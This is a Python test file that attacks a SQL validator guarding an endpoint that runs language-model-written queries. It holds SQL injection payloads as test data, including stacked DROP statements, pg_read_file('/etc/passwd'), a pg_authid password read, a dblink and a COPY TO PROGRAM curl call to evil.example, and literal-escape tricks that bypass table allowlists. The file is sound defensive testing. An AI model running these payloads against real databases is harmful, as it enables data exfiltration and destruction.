"""Adversarial tests for the pure SQL validator guarding `/ask`.

`/ask` used to pick one of four named templates, so injection could not
occur by construction. It now runs SQL a language model wrote, so the
structural guarantee is gone and three independent controls replace it: a
read-only Postgres role, a read-only transaction with a statement timeout,
and this validator. This file attacks the validator only — the role is what
`test_ask_reads.py` proves, by calling the executor with SQL the validator
never saw.

Every case below is written as an attacker would write it, not as a
well-behaved model would. A validator tested only with the queries it was
designed for tells you nothing.
"""

from pathlib import Path

import pytest

from adsignal.warehouse.ask_schema import ALLOWED_TABLES
from adsignal.warehouse.sql_guard import MAX_ROWS, SqlRejected, validate_sql


def _rejection(sql: str) -> SqlRejected:
    """Run `sql` through the validator and return the refusal it raised."""
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    return caught.value


def test_a_plain_select_is_accepted_and_capped() -> None:
    """A query with no LIMIT gets one; the cap is never left to the model."""
    safe = validate_sql("SELECT campaign_id FROM fct_campaign_daily")
    assert safe.startswith("SELECT campaign_id FROM fct_campaign_daily")
    assert safe.rstrip().upper().endswith(f"LIMIT {MAX_ROWS}")


def test_a_leading_cte_is_accepted() -> None:
    """`WITH` is a legitimate opening for a read query, so it is allowed."""
    safe = validate_sql(
        "WITH daily AS (SELECT channel, spend FROM fct_campaign_daily) "
        "SELECT channel, SUM(spend) FROM daily GROUP BY channel LIMIT 10"
    )
    assert "WITH daily" in safe


def test_a_stacked_statement_is_rejected() -> None:
    """The classic: a second statement smuggled in behind a legal first one."""
    refusal = _rejection("SELECT 1 FROM dim_campaign; DROP TABLE dim_campaign")
    assert refusal.rule == "single_statement"


def test_a_trailing_semicolon_alone_is_not_a_second_statement() -> None:
    """One trailing `;` is punctuation, not a stacked statement."""
    assert validate_sql("SELECT campaign_id FROM dim_campaign LIMIT 5;")


def test_a_comment_hiding_a_drop_is_rejected() -> None:
    """Comments exist here only to smuggle payloads, so they are banned outright.

    The parser reads the `--` to end of line and then finds a bare `DROP`
    where nothing may follow, so this is refused before the comment rule is
    reached. Either refusal is correct; what matters is that it is refused.
    """
    refusal = _rejection("SELECT 1 FROM dim_campaign --\nDROP TABLE dim_campaign")
    assert refusal.rule in ("no_comments", "single_statement", "invalid_query")


def test_a_line_comment_on_an_otherwise_valid_query_is_rejected() -> None:
    """The comment rule itself, on a query that parses cleanly without it."""
    refusal = _rejection("SELECT campaign_id FROM dim_campaign LIMIT 5 -- trust me")
    assert refusal.rule == "no_comments"


def test_a_block_comment_is_rejected() -> None:
    """`/*…*/` splits a keyword in two and defeats a naive keyword scan."""
    refusal = _rejection("SELECT 1 FROM dim_campaign /* DROP TABLE dim_campaign */")
    assert refusal.rule == "no_comments"


def test_a_keyword_split_by_a_block_comment_is_rejected() -> None:
    """`DR/**/OP` reads as DROP to Postgres and as nothing to a substring scan."""
    refusal = _rejection("SELECT 1 FROM dim_campaign; DR/**/OP TABLE dim_campaign")
    assert refusal.rule in ("no_comments", "single_statement", "invalid_query")


def test_a_query_that_does_not_start_with_select_or_with_is_rejected() -> None:
    refusal = _rejection("UPDATE fct_campaign_daily SET spend = 0")
    assert refusal.rule in ("select_only", "forbidden_keyword")


@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO dim_campaign VALUES (1)",
        "DELETE FROM dim_campaign",
        "DROP TABLE dim_campaign",
        "ALTER TABLE dim_campaign ADD COLUMN x int",
        "CREATE TABLE evil (x int)",
        "GRANT ALL ON dim_campaign TO public",
        "REVOKE ALL ON dim_campaign FROM public",
        "TRUNCATE dim_campaign",
        "COPY dim_campaign TO '/tmp/out.csv'",
        "CALL some_procedure()",
        "DO $$ BEGIN END $$",
        "SET statement_timeout = 0",
        "VACUUM dim_campaign",
        "ANALYZE dim_campaign",
        "MERGE INTO dim_campaign USING x ON true",
        "REFRESH MATERIALIZED VIEW x",
        "LISTEN channel_one",
        "NOTIFY channel_one",
    ],
)
def test_every_writing_or_administrative_statement_is_rejected(statement: str) -> None:
    """Each is refused: as a non-query root, as a forbidden node, or as unparseable.

    `invalid_query` is in the list because a statement the parser cannot even
    model never produces a tree for the later rules to inspect — and a query
    this endpoint cannot parse is one it will not run.
    """
    refusal = _rejection(statement)
    assert refusal.rule in ("select_only", "forbidden_keyword", "invalid_query")


def test_a_writing_cte_is_rejected() -> None:
    """`WITH x AS (DELETE … RETURNING *)` opens with WITH and still writes."""
    refusal = _rejection(
        "WITH gone AS (DELETE FROM anomaly_predictions RETURNING *) SELECT * FROM gone"
    )
    assert refusal.rule == "forbidden_keyword"


def test_an_inserting_cte_is_rejected() -> None:
    refusal = _rejection(
        "WITH added AS (INSERT INTO dim_campaign VALUES ('x') RETURNING *) SELECT * FROM added"
    )
    assert refusal.rule == "forbidden_keyword"


def test_a_union_against_an_excluded_table_is_rejected() -> None:
    """`model_artifacts` holds pickled estimator bytes and is not answerable."""
    refusal = _rejection(
        "SELECT campaign_id FROM dim_campaign UNION SELECT model_name FROM model_artifacts"
    )
    assert refusal.rule == "table_allowlist"
    assert "model_artifacts" in refusal.reason


def test_a_join_against_the_embedding_table_is_rejected() -> None:
    refusal = _rejection(
        "SELECT c.campaign_id FROM dim_campaign c JOIN entity_embeddings e ON true"
    )
    assert refusal.rule == "table_allowlist"


def test_pg_read_file_is_rejected() -> None:
    """Reading the server's filesystem through a SELECT is still a SELECT."""
    refusal = _rejection("SELECT pg_read_file('/etc/passwd')")
    assert refusal.rule == "forbidden_keyword"


def test_pg_sleep_is_rejected() -> None:
    refusal = _rejection("SELECT pg_sleep(30) FROM dim_campaign")
    assert refusal.rule == "forbidden_keyword"


def test_the_catalog_is_not_readable() -> None:
    refusal = _rejection("SELECT rolname, rolpassword FROM pg_catalog.pg_authid")
    assert refusal.rule == "forbidden_keyword"


def test_information_schema_is_not_readable() -> None:
    refusal = _rejection("SELECT table_name FROM information_schema.tables")
    assert refusal.rule == "forbidden_keyword"


def test_dblink_is_rejected() -> None:
    """Exfiltration to another server is a SELECT too."""
    refusal = _rejection("SELECT * FROM dblink('host=evil.example', 'SELECT 1') AS t(x int)")
    assert refusal.rule == "forbidden_keyword"


def test_copy_program_is_rejected() -> None:
    refusal = _rejection("COPY (SELECT 1) TO PROGRAM 'curl evil.example'")
    assert refusal.rule in ("select_only", "forbidden_keyword")


def test_an_oversized_limit_is_rejected_rather_than_rewritten() -> None:
    """Silently shrinking the model's LIMIT would show the user SQL that never ran."""
    refusal = _rejection("SELECT campaign_id FROM dim_campaign LIMIT 100000")
    assert refusal.rule == "row_limit"
    assert str(MAX_ROWS) in refusal.reason


def test_an_oversized_limit_in_a_subquery_is_rejected() -> None:
    refusal = _rejection(
        "SELECT * FROM (SELECT campaign_id FROM dim_campaign LIMIT 500000) t LIMIT 10"
    )
    assert refusal.rule == "row_limit"


def test_limit_all_does_not_escape_the_cap() -> None:
    """`LIMIT ALL` is Postgres for "no limit". It must not become one.

    The scanner this module used to be saw the word LIMIT, concluded the
    query was already bounded, and appended nothing. The parser drops
    `LIMIT ALL` entirely, so the outer cap is applied — and because what runs
    is rendered from the tree, the `LIMIT ALL` never reaches Postgres either.
    """
    safe = validate_sql("SELECT campaign_id FROM dim_campaign LIMIT ALL")
    assert safe.rstrip().upper().endswith(f"LIMIT {MAX_ROWS}")
    assert "ALL" not in safe.upper()


def test_a_limit_at_the_cap_is_accepted_unchanged() -> None:
    safe = validate_sql(f"SELECT campaign_id FROM dim_campaign LIMIT {MAX_ROWS}")
    assert safe.count("LIMIT") == 1


def test_a_fullwidth_unicode_keyword_does_not_slip_past() -> None:
    """NFKC folds fullwidth forms, so `ＤＲＯＰ` is scanned as `DROP`."""
    refusal = _rejection("SELECT 1 FROM dim_campaign；ＤＲＯＰ TABLE dim_campaign")
    assert refusal.rule in ("single_statement", "forbidden_keyword")


def test_a_zero_width_character_is_rejected() -> None:
    """A zero-width joiner inside a keyword is only ever an evasion attempt."""
    refusal = _rejection("SELECT 1 FROM dim_campaign​ LIMIT 1")
    assert refusal.rule == "unsupported_characters"


def test_a_null_byte_is_rejected() -> None:
    refusal = _rejection("SELECT 1 FROM dim_campaign\x00 LIMIT 1")
    assert refusal.rule == "unsupported_characters"


def test_an_empty_query_is_rejected() -> None:
    refusal = _rejection("   ")
    assert refusal.rule == "empty"


def test_a_schema_qualified_allowlisted_table_is_rejected() -> None:
    """Only the bare names are allowlisted; `public.x` is a different string."""
    refusal = _rejection("SELECT campaign_id FROM public.dim_campaign LIMIT 5")
    assert refusal.rule == "table_allowlist"


def test_an_unknown_table_is_rejected() -> None:
    refusal = _rejection("SELECT * FROM users LIMIT 5")
    assert refusal.rule == "table_allowlist"
    assert "users" in refusal.reason


def test_every_allowlisted_table_can_actually_be_queried() -> None:
    """The allowlist is the contract; each name in it must pass the validator."""
    for table in ALLOWED_TABLES:
        assert validate_sql(f"SELECT * FROM {table}")


def test_the_excluded_tables_are_not_in_the_allowlist() -> None:
    """Pickled estimators and raw vectors cannot contribute to an answer."""
    assert "model_artifacts" not in ALLOWED_TABLES
    assert "entity_embeddings" not in ALLOWED_TABLES
    assert len(ALLOWED_TABLES) == 7


def test_a_refusal_never_carries_internals() -> None:
    """A refusal explains the rule and nothing about the deployment."""
    refusal = _rejection("SELECT * FROM users LIMIT 5")
    text = f"{refusal.reason} {refusal.rule}"
    assert "postgresql://" not in text
    assert "psycopg" not in text
    assert "Traceback" not in text


def test_the_validator_does_no_io() -> None:
    """A pure module: its own source imports nothing that reaches a socket or a file."""
    import adsignal.warehouse.sql_guard as guard

    module_source = guard.__file__
    assert module_source is not None
    text = Path(module_source).read_text(encoding="utf-8")
    for forbidden in ("import psycopg", "import httpx", "import socket", "urlopen"):
        assert forbidden not in text


# Fix round 1, finding 1. Each of these three reached `model_artifacts` or
# `entity_embeddings` — the two tables the allowlist exists to protect —
# through the regex scanner this module originally used. They are the reason
# the validator now parses instead of scanning.


def test_a_quoted_table_name_is_still_checked() -> None:
    """`FROM "model_artifacts"` is the same table with different punctuation."""
    refusal = _rejection('SELECT * FROM "model_artifacts" LIMIT 1')
    assert refusal.rule == "table_allowlist"
    assert "model_artifacts" in refusal.reason


def test_a_comma_joined_table_is_still_checked() -> None:
    """Only the first FROM item follows the word FROM. The rest are tables too."""
    refusal = _rejection("SELECT * FROM dim_campaign, model_artifacts LIMIT 1")
    assert refusal.rule == "table_allowlist"
    assert "model_artifacts" in refusal.reason


def test_a_string_literal_cannot_forge_a_cte_name() -> None:
    """Text inside quotes is data. It must not register `model_artifacts` as a CTE."""
    refusal = _rejection(
        "SELECT 'x, model_artifacts as (' AS note FROM dim_campaign "
        "JOIN model_artifacts m ON true LIMIT 1"
    )
    assert refusal.rule == "table_allowlist"
    assert "model_artifacts" in refusal.reason


def test_a_mixed_case_excluded_table_is_still_checked() -> None:
    refusal = _rejection("SELECT * FROM Model_Artifacts LIMIT 1")
    assert refusal.rule == "table_allowlist"


def test_a_string_literal_containing_a_comment_marker_is_not_a_comment() -> None:
    """A parser knows `'--'` inside quotes is data; a substring scan does not."""
    assert validate_sql("SELECT campaign_id FROM dim_campaign WHERE channel = '--' LIMIT 5")


def test_a_string_literal_containing_a_semicolon_is_not_a_second_statement() -> None:
    assert validate_sql("SELECT campaign_id FROM dim_campaign WHERE channel = 'a;b' LIMIT 5")


def test_a_small_subquery_limit_does_not_suppress_the_outer_cap() -> None:
    """Fix round 1, finding 2: an inner LIMIT is not a bound on what comes back."""
    safe = validate_sql(
        "SELECT * FROM (SELECT campaign_id FROM dim_campaign LIMIT 5) t JOIN dim_campaign d ON true"
    )
    assert safe.rstrip().upper().endswith(f"LIMIT {MAX_ROWS}")


def test_a_cte_the_query_really_defines_is_still_allowed() -> None:
    safe = validate_sql(
        "WITH recent AS (SELECT campaign_id FROM fct_campaign_daily) "
        "SELECT campaign_id FROM recent LIMIT 10"
    )
    assert "recent" in safe


# Fix round 2. The parse-and-render rewrite closed three bypasses and opened a
# worse one: sqlglot's renderer and Postgres disagreed about where a string
# literal ends, so text classified as data came back out as SQL.


def test_an_escape_string_that_re_parses_differently_is_refused() -> None:
    """The regression: `E'\\'` renders as `e'\\'`, which Postgres reads as an
    escaped quote rather than a terminator.

    The literal's boundary moved between what was validated and what would
    have executed. The rendered query re-parsed to `FROM model_artifacts`
    with the row cap swallowed into a comment — the allowlist, the cap and
    the comment rule all defeated by one payload.
    """
    refusal = _rejection(
        "SELECT E'\\\\' AS a, ', b FROM model_artifacts --' AS c FROM dim_campaign"
    )
    assert refusal.rule in ("round_trip", "table_allowlist", "invalid_query")


def test_a_cte_declared_inside_a_subquery_does_not_launder_the_outer_table() -> None:
    """A CTE name is only a table within the scope that declares it."""
    refusal = _rejection(
        "SELECT * FROM model_artifacts WHERE 1 IN "
        "(WITH model_artifacts AS (SELECT 1 AS x) SELECT x FROM model_artifacts)"
    )
    assert refusal.rule == "table_allowlist"
    assert "model_artifacts" in refusal.reason


def test_a_cte_declared_inside_a_derived_table_does_not_launder_a_join() -> None:
    refusal = _rejection(
        "SELECT * FROM (WITH model_artifacts AS (SELECT 1 AS x) SELECT x FROM model_artifacts) s "
        "JOIN model_artifacts m ON true"
    )
    assert refusal.rule == "table_allowlist"


def test_the_same_laundering_does_not_work_for_the_embedding_table() -> None:
    refusal = _rejection(
        "SELECT * FROM entity_embeddings WHERE 1 IN "
        "(WITH entity_embeddings AS (SELECT 1 AS x) SELECT x FROM entity_embeddings)"
    )
    assert refusal.rule == "table_allowlist"


def test_an_oversized_fetch_first_is_refused_like_an_oversized_limit() -> None:
    """`FETCH FIRST n ROWS ONLY` is LIMIT in standard spelling.

    The first parser version knew `Limit` and not `Fetch`, so this was
    accepted and rendered uncapped — a rule that had been failing closed
    (a syntax error) started failing open.
    """
    refusal = _rejection("SELECT campaign_id FROM dim_campaign FETCH FIRST 100000 ROWS ONLY")
    assert refusal.rule == "row_limit"


def test_a_small_fetch_first_is_accepted_and_still_bounded() -> None:
    safe = validate_sql("SELECT campaign_id FROM dim_campaign FETCH FIRST 5 ROWS ONLY")
    assert "5" in safe


def test_validation_is_idempotent() -> None:
    """Whatever comes out must validate to itself.

    This is the invariant the escape-string regression broke: a validator
    whose own output re-parses to something else has not finished its job.
    """
    for query in (
        "SELECT campaign_id FROM dim_campaign",
        "SELECT channel, SUM(spend) AS s FROM fct_campaign_daily GROUP BY channel",
        "WITH recent AS (SELECT campaign_id FROM fct_campaign_daily) SELECT * FROM recent LIMIT 10",
        "SELECT campaign_id FROM dim_campaign WHERE channel = 'search' LIMIT 5",
    ):
        once = validate_sql(query)
        assert validate_sql(once) == once


# Fix round 3. Two ways the SQL Postgres executes could still differ in
# meaning from the SQL that was approved.


@pytest.mark.parametrize(
    "call",
    [
        "query_to_xml('SELECT * FROM model_artifacts', true, true, '')",
        "query_to_xmlschema('SELECT * FROM model_artifacts', true, true, '')",
        "table_to_xml('model_artifacts', true, true, '')",
        "schema_to_xml('public', true, true, '')",
        "database_to_xml(true, true, '')",
    ],
)
def test_a_function_that_takes_sql_as_a_string_is_refused(call: str) -> None:
    """Second-order SQL: the validator sees one table, Postgres runs another query.

    `query_to_xml` returns a single value containing an entire table, so it
    defeats the row cap and the bounded fetch as well as the allowlist —
    the reviewer's payload came back as one 8 MB value.
    """
    refusal = _rejection(f"SELECT {call} FROM dim_campaign")
    assert refusal.rule == "forbidden_function"


def test_an_unrecognised_function_is_refused_even_when_harmless() -> None:
    """The control is an allow-list, so a benign unknown is refused too.

    That is the point: a deny-list has to name `query_to_xml` before it can
    refuse it, and nobody had. This refuses everything sqlglot does not
    recognise as a standard function, so the next `*_to_xml`, the next
    extension and the next catalog helper are all refused without anyone
    having thought of them.
    """
    refusal = _rejection("SELECT txid_current() FROM dim_campaign")
    assert refusal.rule == "forbidden_function"


@pytest.mark.parametrize(
    "query",
    [
        "SELECT SUM(spend), COUNT(*), AVG(cpa), MIN(spend), MAX(spend) FROM fct_campaign_daily",
        "SELECT ROUND(AVG(cpa), 2), COALESCE(cpa, 0) FROM fct_campaign_daily",
        "SELECT DATE_TRUNC('month', event_date) FROM fct_campaign_daily",
        "SELECT EXTRACT(year FROM event_date) FROM fct_campaign_daily",
        "SELECT ROW_NUMBER() OVER (ORDER BY spend DESC) FROM fct_campaign_daily",
        "SELECT LOWER(channel), UPPER(channel), LENGTH(channel) FROM dim_campaign",
        "SELECT to_char(event_date, 'YYYY-MM') FROM fct_campaign_daily",
        "SELECT greatest(spend, revenue), abs(spend) FROM fct_campaign_daily",
        "SELECT stddev(spend), corr(spend, revenue) FROM fct_campaign_daily",
    ],
)
def test_the_functions_a_real_answer_needs_still_work(query: str) -> None:
    """The allow-list has to leave the endpoint able to answer questions."""
    assert validate_sql(query)


def test_a_percent_row_bound_is_refused() -> None:
    """`FETCH FIRST 50 PERCENT ROWS ONLY` is not a bound of 50 rows.

    It was read as 50 and rendered with PERCENT intact, so Postgres rejected
    it and it surfaced as `invalid_query` — fail-closed by accident. A bound
    the validator cannot interpret as a row count is refused as one.
    """
    refusal = _rejection("SELECT campaign_id FROM dim_campaign FETCH FIRST 50 PERCENT ROWS ONLY")
    assert refusal.rule == "row_limit"


def test_a_backslash_literal_that_depends_on_a_server_setting_is_refused() -> None:
    """The round-trip check cannot see this one, so the executor pins the GUC.

    With `standard_conforming_strings = off` Postgres reads the `\\` as an
    escape and the literal's boundary moves, exactly as it did for the
    `E''` regression — but sqlglot's Postgres dialect always assumes `on`,
    so re-parsing the rendered string can never reveal the difference.
    `warehouse.ask_reads` pins the setting for every execution; this test
    records that the validator alone does not decide this one.
    """
    approved = validate_sql(
        "SELECT '\\' AS a, ', 1 AS z FROM model_artifacts --' AS c FROM dim_campaign"
    )
    assert "model_artifacts" in approved, "the literal is data under the pinned setting"


# Fix round 4. The allow-list was too tight: 18 legitimate functions were
# refused, and they were exactly the ones a model emits for ordinary
# questions. Each admitted one is proved against the three promises in
# `_ALLOWED_UNKNOWN_FUNCTIONS`'s own comment; the proofs are in the report.


@pytest.mark.parametrize(
    "query",
    [
        "SELECT age(now(), event_date) FROM fct_campaign_daily",
        "SELECT make_date(2024, 1, 1) FROM dim_campaign",
        "SELECT num_nonnulls(cpa, roas) FROM fct_campaign_daily",
        "SELECT isfinite(event_date) FROM fct_campaign_daily",
        "SELECT clock_timestamp() FROM dim_campaign",
        "SELECT statement_timestamp() FROM dim_campaign",
        "SELECT timezone('UTC', now()) FROM dim_campaign",
        "SELECT every(is_anomaly) FROM fct_campaign_daily",
        "SELECT cardinality(ARRAY[1, 2]) FROM dim_campaign",
        "SELECT quote_literal(channel) FROM dim_campaign",
        "SELECT regexp_matches(channel, '^s') FROM dim_campaign",
        "SELECT regexp_split_to_array(channel, '_') FROM dim_campaign",
        "SELECT to_json(channel) FROM dim_campaign",
        "SELECT json_build_object('c', channel) FROM dim_campaign",
        "SELECT jsonb_build_object('c', channel) FROM dim_campaign",
        "SELECT jsonb_agg(channel) FROM dim_campaign",
        "SELECT row_to_json(d) FROM dim_campaign d",
    ],
)
def test_the_admitted_functions_are_accepted(query: str) -> None:
    """One test per admitted entry, so removing one is visible."""
    assert validate_sql(query)


def test_setseed_stays_refused() -> None:
    """It mutates session state and answers no question about campaigns."""
    refusal = _rejection("SELECT setseed(0.5) FROM dim_campaign")
    assert refusal.rule == "forbidden_function"


def test_date_bin_with_a_literal_origin_is_accepted() -> None:
    """sqlglot parsed the origin as a bare `Var` and rendered it unquoted.

    `'2024-01-01'` came back as `2024-01-01`, which re-parses as arithmetic,
    so the round-trip check refused a perfectly ordinary query. The renderer
    is the thing at fault, and a `Var` whose text is not a valid identifier
    can only have come from a string literal.
    """
    safe = validate_sql(
        "SELECT date_bin('1 week', event_date, '2024-01-01') FROM fct_campaign_daily"
    )
    assert "'2024-01-01'" in safe


def test_a_schema_qualified_operator_is_refused() -> None:
    """`OPERATOR(pg_catalog.||)` carries its qualifier outside any identifier.

    No core operator takes SQL or touches the filesystem, so this is not
    exploitable — but the README says no `pg_*` identifier reaches the
    database, and that sentence should be true.
    """
    refusal = _rejection("SELECT 'a' OPERATOR(pg_catalog.||) 'b' FROM dim_campaign")
    assert refusal.rule == "forbidden_keyword"


def test_an_ordinary_operator_still_works() -> None:
    assert validate_sql("SELECT channel || '!' FROM dim_campaign")
